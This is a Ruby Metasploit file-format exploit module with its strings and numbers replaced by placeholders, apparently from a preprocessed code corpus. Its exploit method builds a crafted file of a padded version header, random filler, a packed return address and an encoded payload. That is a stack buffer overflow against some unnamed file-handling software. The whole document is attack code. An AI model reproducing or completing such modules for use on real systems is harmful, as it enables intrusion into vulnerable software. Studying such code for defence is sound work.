require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > true , <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <hex> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def exploit version = <str> version << <str> * ( <hex> - version . length ) entry = <str> entry << rand_text_alpha ( target [ <str> ] ) entry << [ target . ret ] . pack ( <str> ) entry << rand_text_alpha ( <int> ) entry << payload . encoded kvl_file = version kvl_file << entry file_create ( kvl_file ) end end 
